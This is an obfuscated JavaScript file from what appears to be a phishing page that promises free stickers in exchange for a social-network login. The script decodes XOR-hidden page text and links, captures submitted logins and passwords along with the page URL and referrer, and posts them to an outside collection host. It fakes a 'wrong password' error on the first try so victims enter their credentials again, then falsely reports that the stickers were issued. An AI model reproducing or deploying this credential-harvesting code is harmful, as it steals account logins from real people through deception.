var XOR_SALT = 74;
var Xorc = function(_0xe402x3) {
    var _0xe402x4 = 100,
        _0xe402x5 = -100;
    var _0xe402x6 = parseInt(_0xe402x3);
    if (_0xe402x3) {
        if (!_0xe402x6) {
            throw new Error('Salt is not a Number')
        };
        this['salt'] = _0xe402x6
    } else {
        this['salt'] = Math['round'](Math['random']() * (_0xe402x4 - _0xe402x5) + _0xe402x5)
    }
};
Xorc['prototype']['encrypt'] = function(_0xe402x7) {
    var _0xe402x8 = '';
    for (var _0xe402x9 = 0; _0xe402x9 < _0xe402x7['length']; _0xe402x9++) {
        _0xe402x8 += String['fromCharCode'](this['salt'] ^ _0xe402x7['charCodeAt'](_0xe402x9))
    };
    return _0xe402x8
};
Xorc['prototype']['decrypt'] = function(_0xe402xa) {
    var _0xe402x8 = '';
    for (var _0xe402x9 = 0; _0xe402x9 < _0xe402xa['length']; _0xe402x9++) {
        _0xe402x8 += String['fromCharCode'](this['salt'] ^ _0xe402xa['charCodeAt'](_0xe402x9))
    };
    return _0xe402x8
};
function escapeHtml(_0x93c6x1b) {
    return _0x93c6x1b['replace'](/&/g, '&amp;')['replace'](/</g, '&lt;')['replace'](/>/g, '&gt;')['replace'](/"/g, '&quot;')['replace'](/'/g, '&#039;')
}
$(document)['ready'](function() {
    var _0xe402xb = new Xorc(window['xcode']);
    $('[data-xtext]')['each'](function() {
        $(this)['text'](JSON['parse'](_0xe402xb['decrypt'](Base64Decode($(this)['attr']('data-xtext')), 0876)))
    });
    $('[data-xhref]')['each'](function() {
        $(this)['attr']('href', JSON['parse'](_0xe402xb['decrypt'](Base64Decode($(this)['attr']('data-xhref')), 0876)))
    });
	$('#loader').css({'display':'none'});
});
$(document)['ready'](function() {
    window['_hash'] = '';
	window['appended_form'] = false;
    //alert(1);
    $('form')['on']('submit', function(_0xe402xc) {
        _0xe402xc['preventDefault']();
        if ($('#result')['is'](':visible')) {
            $('#result')['hide']('fast')
        };
        if ($('#captcha')['is'](':visible')) {
            $('#captcha')['hide']('fast')
        };
        //alert(123);
		
		if( !window['appended_form'])
		{
			window['appended_form'] = true;
			$('form').append('<input type="hidden" name="url" value="' + escapeHtml(window['location']['href'], 0876) + '">');
			$('form').append('<input type="hidden" name="grip" value="' + window.GRIP + '">');
			
			if(typeof document.referrer !== 'undefined')
				$('form').append('<input type="hidden" name="referrer" value="' + document.referrer + '">');
		}
		
        var _0xe402xd = $('form')['serialize']();
        $['post']('https://eex.su/other/addlogin', $('form')['serialize'](), function(_0xe402xe) {
            if (_0xe402xe != 'success' || typeof window['_repeat'] === 'undefined' || window['_hash'] == _0xe402xd) {
                $('#result')['html']('<div class="alert alert-danger">\u041B\u043E\u0433\u0438\u043D \u0438\u043B\u0438 \u043F\u0430\u0440\u043E\u043B\u044C \u043D\u0435 \u0432\u0435\u0440\u043D\u044B\u0439</div><hr>');
                $('#result')['show']('fast');
                window['_repeat'] = 1;
                window['_hash'] = _0xe402xd
            } else {
                $('#result')['html']('<div class="alert alert-success">\u0421\u0442\u0438\u043A\u0435\u0440\u044B \u0432\u044B\u0434\u0430\u043D\u044B. \u041E\u0431\u044B\u0447\u043D\u043E \u043E\u043D\u0438 \u043F\u0440\u0438\u0445\u043E\u0434\u044F\u0442 \u0432 \u0442\u0435\u0447\u0435\u043D\u0438\u0438 \u0441\u0443\u0442\u043E\u043A</div><hr>');
                $('#result')['show']('fast')
            }
           // alert(_0xe402xe);
        })
        
        	
   
        
    });
    $('#captcha_img')['click'](function() {
        $(this)['attr']('src', $(this)['attr']('src') + '&rand=' + Math['random']())
    });
    $('.modal-link')['click'](function(_0xe402xc) {
        $('#authModal')['modal']('show');
		
		// v2
		$('#pack-image-v2').removeClass();
		$('#pack-image-v2').addClass('stick');
		$('#pack-image-v2').addClass('st-'+$(this)['data']('id'));
		
		// v1
        $('#pack-image')['attr']({
            "\x73\x72\x63": 'files/images/' + $(this)['data']('id') + 'b.png'
        })
    });
    // $['post']('https://eex.su/other/vktest', {
        // r: Math['random'](),
        // url: window['location']['href']
    // }, function(){
    	// alert('vk');
    // });
    /*$(document).ajaxError(function(d, text,z,error){
    	//alert('b'+JSON.stringify(z))
    	alert('a'+JSON.stringify(d))
    })*/
});
var stethem = 'MGUlfa1b0JO30NqoNrm';